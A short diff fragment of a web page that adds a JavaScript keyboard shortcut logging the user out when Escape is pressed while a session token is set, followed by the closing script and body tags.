+document.addEventListener('keydown', e => { if (e.key === 'Escape' && TOKEN) logout(); });
 </script>
 
 </body>
